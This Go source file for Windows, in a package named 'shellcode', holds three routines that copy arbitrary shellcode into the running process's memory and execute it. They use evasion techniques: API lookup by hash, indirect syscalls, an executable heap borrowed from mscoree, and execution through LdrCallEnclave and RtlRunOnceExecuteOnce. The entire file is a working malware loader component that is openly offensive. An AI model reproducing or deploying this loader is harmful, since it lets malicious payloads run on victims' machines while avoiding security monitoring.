//go:build windows
// +build windows

package shellcode

import (
	"fmt"
	"unsafe"

	wc "github.com/carved4/go-wincall"
)

func memcpy(dst, src uintptr, size uintptr) {
	dstSlice := unsafe.Slice((*byte)(unsafe.Pointer(dst)), size)
	srcSlice := unsafe.Slice((*byte)(unsafe.Pointer(src)), size)
	copy(dstSlice, srcSlice)
}

const (
	CURRENT_PROCESS = ^uintptr(0) // -1 as uintptr, equivalent to GetCurrentProcess()
)

// uses non standard winapi for shellcode injection, mscoree for RWX heap, vdsutil for alloc on heap, LdrCallEnclave to execute
func EnclaveInject(shellcode []byte) error {
	vdsBase := wc.LoadLibraryLdr("vdsutil.dll")
	ntdllBase := wc.GetModuleBase(wc.GetHash("ntdll.dll"))
	mscoreeBase := wc.LoadLibraryLdr("mscoree.dll")
	mscoreeHeap := wc.GetFunctionAddress(mscoreeBase, wc.GetHash("GetProcessExecutableHeap"))
	ldrCallEnclave := wc.GetFunctionAddress(ntdllBase, wc.GetHash("LdrCallEnclave"))
	vdsHeapAlloc := wc.GetFunctionAddress(vdsBase, wc.GetHash("VdsHeapAlloc"))
	rwxHeapPtr, _, _ := wc.CallG0(mscoreeHeap)
	allocatedHeap, _, _ := wc.CallG0(vdsHeapAlloc, rwxHeapPtr, 0x00000008, len(shellcode))
	memcpy(allocatedHeap, uintptr(unsafe.Pointer(&shellcode[0])), uintptr(len(shellcode)))
	var returnParam unsafe.Pointer
	_, _, _ = wc.CallG0(ldrCallEnclave,
		allocatedHeap,
		uintptr(uint32(0)),
		uintptr(unsafe.Pointer(&returnParam)),
	)
	return nil
}

func IndirectSyscallInject(shellcode []byte) error {
	ntAlloc := wc.GetSyscall(wc.GetHash("NtAllocateVirtualMemory"))
	ntProtect := wc.GetSyscall(wc.GetHash("NtProtectVirtualMemory"))
	var baseAddress uintptr
	regionSize := uintptr(len(shellcode))
	ret, _ := wc.IndirectSyscall(ntAlloc.SSN, ntAlloc.Address,
		CURRENT_PROCESS,
		uintptr(unsafe.Pointer(&baseAddress)),
		0,
		uintptr(unsafe.Pointer(&regionSize)),
		0x00001000|0x00002000,
		0x04,
	)
	if ret != 0 {
		return fmt.Errorf("NtAllocateVirtualMemory failed: 0x%x", ret)
	}
	memcpy(baseAddress, uintptr(unsafe.Pointer(&shellcode[0])), uintptr(len(shellcode)))
	var oldProtect uintptr
	protectSize := uintptr(len(shellcode))
	ret, _ = wc.IndirectSyscall(ntProtect.SSN, ntProtect.Address,
		CURRENT_PROCESS,
		uintptr(unsafe.Pointer(&baseAddress)),
		uintptr(unsafe.Pointer(&protectSize)),
		0x20,
		uintptr(unsafe.Pointer(&oldProtect)),
	)
	if ret != 0 {
		return fmt.Errorf("NtProtectVirtualMemory failed: 0x%x", ret)
	}
	ntdllBase := wc.GetModuleBase(wc.GetHash("ntdll.dll"))
	rtlCreateThr := wc.GetFunctionAddress(ntdllBase, wc.GetHash("RtlCreateUserThread"))
	var threadHandle uintptr
	ret, _, _ = wc.CallG0(rtlCreateThr,
		CURRENT_PROCESS,
		0,
		0,
		0,
		0,
		0,
		baseAddress,
		0,
		uintptr(unsafe.Pointer(&threadHandle)),
		0,
	)
	if ret != 0 {
		return fmt.Errorf("RtlCreateUserThread failed: 0x%x", ret)
	}
	wc.Call("kernel32.dll", "WaitForSingleObject", threadHandle, 0xFFFFFFFF)
	return nil
}

func RunOnce(shellcode []byte) error {
	ntAlloc := wc.GetSyscall(wc.GetHash("NtAllocateVirtualMemory"))
	ntProtect := wc.GetSyscall(wc.GetHash("NtProtectVirtualMemory"))
	var baseAddress uintptr
	regionSize := uintptr(len(shellcode))
	ret, _ := wc.IndirectSyscall(ntAlloc.SSN, ntAlloc.Address,
		CURRENT_PROCESS,
		uintptr(unsafe.Pointer(&baseAddress)),
		0,
		uintptr(unsafe.Pointer(&regionSize)),
		0x00001000|0x00002000,
		0x04,
	)
	if ret != 0 {
		return fmt.Errorf("NtAllocateVirtualMemory failed: 0x%x", ret)
	}
	memcpy(baseAddress, uintptr(unsafe.Pointer(&shellcode[0])), uintptr(len(shellcode)))
	var oldProtect uintptr
	protectSize := uintptr(len(shellcode))
	ret, _ = wc.IndirectSyscall(ntProtect.SSN, ntProtect.Address,
		CURRENT_PROCESS,
		uintptr(unsafe.Pointer(&baseAddress)),
		uintptr(unsafe.Pointer(&protectSize)),
		0x20,
		uintptr(unsafe.Pointer(&oldProtect)),
	)
	if ret != 0 {
		return fmt.Errorf("NtProtectVirtualMemory failed: 0x%x", ret)
	}
	ntdllBase := wc.GetModuleBase(wc.GetHash("ntdll.dll"))
	rtlRunOnceExecuteOnce := wc.GetFunctionAddress(ntdllBase, wc.GetHash("RtlRunOnceExecuteOnce"))
	var runOnceStruct uintptr
	var context uintptr
	wc.CallG0(
		rtlRunOnceExecuteOnce,
		uintptr(unsafe.Pointer(&runOnceStruct)),
		baseAddress,
		uintptr(unsafe.Pointer(&context)),
	)
	return nil
}
